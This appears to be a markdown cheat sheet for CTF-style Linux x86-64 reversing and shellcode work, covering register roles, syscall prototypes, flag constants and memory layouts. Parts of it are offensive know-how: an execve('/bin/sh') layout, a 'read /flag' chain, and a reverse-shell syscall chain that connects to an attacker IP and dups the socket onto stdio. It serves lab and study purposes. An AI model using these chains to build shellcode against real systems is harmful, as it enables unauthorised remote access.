# x86-64 / AMD64 — [Back to Main](../README.md)

Reference for Linux x86-64 reversing, shellcode, and exploit development. Focus: what registers mean, how syscalls map to C-style prototypes, and what arguments actually point to.

---

## Register roles that matter in labs

| Register | Usual role |
|---|---|
| `rax` | return value; syscall number before `syscall` |
| `rdi` | function arg1 / syscall arg1 |
| `rsi` | function arg2 / syscall arg2 |
| `rdx` | function arg3 / syscall arg3 |
| `rcx` | function arg4 for normal C calls; clobbered by `syscall` |
| `r10` | syscall arg4; use this instead of `rcx` for Linux syscalls |
| `r8` | function/syscall arg5 |
| `r9` | function/syscall arg6 |
| `rsp` | stack pointer |
| `rbp` | frame pointer if compiler keeps one |
| `rip` | instruction pointer |

Normal System V AMD64 function call args:

```text
arg1=rdi, arg2=rsi, arg3=rdx, arg4=rcx, arg5=r8, arg6=r9
return=rax
```

Linux syscall args:

```text
rax=syscall_number, arg1=rdi, arg2=rsi, arg3=rdx, arg4=r10, arg5=r8, arg6=r9
return=rax
```

Why `r10` matters: the `syscall` instruction itself clobbers `rcx` and `r11`, so Linux uses `r10` for the fourth syscall argument.

---

## Reading syscall assembly like pseudocode

Pattern:

```asm
mov rax, <syscall_number>
mov rdi, <arg1>
mov rsi, <arg2>
mov rdx, <arg3>
mov r10, <arg4>
syscall
```

Translate it as:

```c
rax = syscall_<name>(rdi, rsi, rdx, r10, r8, r9);
```

In GDB/pwndbg, when stopped on `syscall`:

```gdb
p/x $rax
p/x $rdi
p/x $rsi
p/x $rdx
p/x $r10
x/s $rdi      # if arg1 is char *
x/s $rsi      # if arg2 is char * or buffer
x/32bx $rsi   # if arg2 is bytes/buffer
```

---

## Common Linux x86-64 syscalls with prototypes

Use this when a table gives only registers and you need to know what each pointer/value means.

| # | Syscall | C-style prototype | Register mapping | Notes |
|---:|---|---|---|---|
| `0` | `read` | `ssize_t read(int fd, void *buf, size_t count)` | `rdi=fd`, `rsi=buf`, `rdx=count` | Reads up to `count` bytes from fd into writable memory at `buf`; returns bytes read. |
| `1` | `write` | `ssize_t write(int fd, const void *buf, size_t count)` | `rdi=fd`, `rsi=buf`, `rdx=count` | Writes `count` bytes from memory at `buf` to fd. `fd=1` stdout, `2` stderr. |
| `2` | `open` | `int open(const char *pathname, int flags, mode_t mode)` | `rdi=pathname`, `rsi=flags`, `rdx=mode` | `pathname` is a null-terminated string. `mode` only matters with `O_CREAT`. |
| `3` | `close` | `int close(int fd)` | `rdi=fd` | Closes fd. |
| `9` | `mmap` | `void *mmap(void *addr, size_t len, int prot, int flags, int fd, off_t off)` | `rdi=addr`, `rsi=len`, `rdx=prot`, `r10=flags`, `r8=fd`, `r9=off` | Common for RWX memory, heap-like mappings, shellcode staging. |
| `10` | `mprotect` | `int mprotect(void *addr, size_t len, int prot)` | `rdi=addr`, `rsi=len`, `rdx=prot` | Changes page permissions. `addr` must be page-aligned. Used to make stack/heap executable. |
| `41` | `socket` | `int socket(int domain, int type, int protocol)` | `rdi=domain`, `rsi=type`, `rdx=protocol` | `AF_INET=2`, `SOCK_STREAM=1`, protocol usually `0`. |
| `42` | `connect` | `int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)` | `rdi=sockfd`, `rsi=addr`, `rdx=addrlen` | `addr` points to `sockaddr_in` for IPv4. Useful in reverse shell shellcode. |
| `49` | `bind` | `int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)` | `rdi=sockfd`, `rsi=addr`, `rdx=addrlen` | Bind shell setup. |
| `50` | `listen` | `int listen(int sockfd, int backlog)` | `rdi=sockfd`, `rsi=backlog` | Bind shell setup. |
| `43` | `accept` | `int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)` | `rdi=sockfd`, `rsi=addr`, `rdx=addrlen_ptr` | Returns connected client fd. |
| `57` | `fork` | `pid_t fork(void)` | none | Child gets return `0`; parent gets child PID. |
| `59` | `execve` | `int execve(const char *pathname, char *const argv[], char *const envp[])` | `rdi=pathname`, `rsi=argv`, `rdx=envp` | Most important shell syscall. See detailed layout below. |
| `60` | `exit` | `void exit(int status)` | `rdi=status` | Exits current process. |
| `62` | `kill` | `int kill(pid_t pid, int sig)` | `rdi=pid`, `rsi=sig` | Signal process. |
| `72` | `fcntl` | `int fcntl(int fd, int cmd, long arg)` | `rdi=fd`, `rsi=cmd`, `rdx=arg` | Sometimes used to set nonblocking sockets or duplicate fd behavior. |
| `87` | `unlink` | `int unlink(const char *pathname)` | `rdi=pathname` | Deletes a filesystem name. |
| `89` | `readlink` | `ssize_t readlink(const char *path, char *buf, size_t bufsiz)` | `rdi=path`, `rsi=buf`, `rdx=bufsiz` | Reads symlink target. No null terminator guaranteed. |
| `101` | `ptrace` | `long ptrace(enum request, pid_t pid, void *addr, void *data)` | `rdi=request`, `rsi=pid`, `rdx=addr`, `r10=data` | Anti-debugging often calls `ptrace(PTRACE_TRACEME, 0, NULL, NULL)`. |
| `158` | `arch_prctl` | `int arch_prctl(int code, unsigned long addr)` | `rdi=code`, `rsi=addr` | Sets/gets FS/GS base; common in thread-local storage setup. |
| `231` | `exit_group` | `void exit_group(int status)` | `rdi=status` | Exits all threads; glibc often uses this instead of raw `exit`. |
| `257` | `openat` | `int openat(int dirfd, const char *pathname, int flags, mode_t mode)` | `rdi=dirfd`, `rsi=pathname`, `rdx=flags`, `r10=mode` | Modern libc often uses `openat(AT_FDCWD, path, flags, mode)` instead of `open`. |

---

## `execve` argument layout: the one that matters most

Prototype:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

Register mapping:

```text
rax = 59
rdi = pathname  -> pointer to string, e.g. "/bin/sh\0"
rsi = argv      -> pointer to array of char* pointers, terminated by NULL
rdx = envp      -> pointer to array of char* pointers, terminated by NULL, or NULL
```

Pseudocode:

```c
pathname = "/bin/sh";
argv = { "/bin/sh", NULL };
envp = NULL;
execve(pathname, argv, envp);
```

Memory should look like:

```text
0x404000: 2f 62 69 6e 2f 73 68 00        "/bin/sh\0"
0x404100: 00 40 40 00 00 00 00 00        argv[0] -> 0x404000
0x404108: 00 00 00 00 00 00 00 00        argv[1] = NULL
```

Then registers:

```text
rdi = 0x404000
rsi = 0x404100
rdx = 0
rax = 59
syscall
```

If argv includes flags:

```c
pathname = "/bin/sh";
argv = { "/bin/sh", "-c", "id; /bin/sh", NULL };
envp = NULL;
execve(pathname, argv, envp);
```

Memory:

```text
str0: "/bin/sh\0"
str1: "-c\0"
str2: "id; /bin/sh\0"
argv: &str0, &str1, &str2, NULL
```

Register mapping is still `rdi=&str0`, `rsi=&argv`, `rdx=0`.

---

## File I/O pseudocode chain

Read `/flag` and write it to stdout:

```c
fd = open("/flag", O_RDONLY, 0);
n = read(fd, buf, 0x100);
write(1, buf, n);
exit(0);
```

Syscall intent:

```text
open:  rax=2, rdi=&"/flag", rsi=0, rdx=0
read:  rax=0, rdi=fd,       rsi=&buf,    rdx=0x100
write: rax=1, rdi=1,        rsi=&buf,    rdx=n
exit:  rax=60,rdi=0
```

---

## Socket reverse-shell syscall chain

High-level pseudocode:

```c
s = socket(AF_INET, SOCK_STREAM, 0);
connect(s, &sockaddr_in, sizeof(sockaddr_in));
dup2(s, 0);
dup2(s, 1);
dup2(s, 2);
execve("/bin/sh", {"/bin/sh", NULL}, NULL);
```

Important constants:

```text
AF_INET = 2
SOCK_STREAM = 1
IPPROTO_IP = 0
```

`sockaddr_in` layout for IPv4:

```c
struct sockaddr_in {
    short sin_family;   // AF_INET = 2
    unsigned short sin_port; // network byte order, e.g. htons(4444)
    struct in_addr sin_addr; // attacker IP, network byte order
    char sin_zero[8];
};
```

`connect` registers:

```text
rax=42
rdi=sockfd
rsi=&sockaddr_in
rdx=16
```

---

## Permission constants quick ref

`mprotect` / `mmap` `prot` bitmask:

| Constant | Value | Meaning |
|---|---:|---|
| `PROT_READ` | `1` | readable |
| `PROT_WRITE` | `2` | writable |
| `PROT_EXEC` | `4` | executable |
| `PROT_READ|PROT_WRITE|PROT_EXEC` | `7` | RWX |

Common `mmap` flags:

| Constant | Value | Meaning |
|---|---:|---|
| `MAP_PRIVATE` | `2` | private mapping |
| `MAP_ANONYMOUS` | `0x20` | not backed by file |

Common `open` flags:

| Constant | Value | Meaning |
|---|---:|---|
| `O_RDONLY` | `0` | read only |
| `O_WRONLY` | `1` | write only |
| `O_RDWR` | `2` | read/write |
| `O_CREAT` | `0x40` | create if missing; requires `mode` |
| `O_TRUNC` | `0x200` | truncate existing file |
| `O_APPEND` | `0x400` | append writes |

---

## References worth opening

- `man 2 <syscall>` — best source for prototypes, return values, required pointers, and errors.
- `/usr/include/asm/unistd_64.h` — syscall numbers on the local box.
- `/usr/include/bits/fcntl-linux.h` — flag values for `open`/`openat`.
- `/usr/include/x86_64-linux-gnu/bits/mman-linux.h` — `mmap`/`mprotect` constants.
- Shell-Storm x86-64 syscall table — fast number lookup, then use `man 2` for pseudocode/prototype.
